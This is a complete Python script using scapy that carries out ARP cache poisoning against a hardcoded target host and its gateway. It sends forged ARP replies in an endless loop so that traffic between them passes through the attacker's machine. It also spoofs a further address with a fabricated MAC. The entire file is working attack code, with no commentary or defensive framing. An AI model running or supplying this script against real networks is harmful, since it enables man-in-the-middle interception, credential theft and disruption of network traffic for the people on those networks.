from scapy.all import *

INTERFACE = 'eth0'
TARGET_IP = '198.13.0.14'
GATEWAY_IP = '198.13.0.1'


def get_mac(ip_add):
    response, unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip_add),
                               timeout=2, retry=10)
    for s, r in response:
        return r[Ether].src
    return None


def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    poison_gateway_fakemac = ARP()
    poison_gateway_fakemac.op = 2
    poison_gateway_fakemac.psrc = '198.13.0.15'
    poison_gateway_fakemac.hwsrc = 'ab:cd:ef:ab:cd:ef'
    poison_gateway_fakemac.pdst = gateway_ip
    poison_gateway_fakemac.hwdst = gateway_mac

    poison_target_fakemac = ARP()
    poison_target_fakemac.op = 2
    poison_target_fakemac.psrc = '198.13.0.15'
    poison_target_fakemac.hwsrc = 'ab:cd:ef:ab:cd:ef'
    poison_target_fakemac.pdst = target_ip
    poison_target_fakemac.hwdst = target_mac

    while 1:
        send(poison_target)
        send(poison_gateway)
        send(poison_gateway_fakemac)
        send(poison_target_fakemac)
        time.sleep(2)


if __name__ == '__main__':
    conf.iface = INTERFACE
    conf.verb = 0
    GATEWAY_MAC = get_mac(GATEWAY_IP)
    TARGET_MAC = get_mac(TARGET_IP)
    poison_target(GATEWAY_IP, GATEWAY_MAC, TARGET_IP, TARGET_MAC)
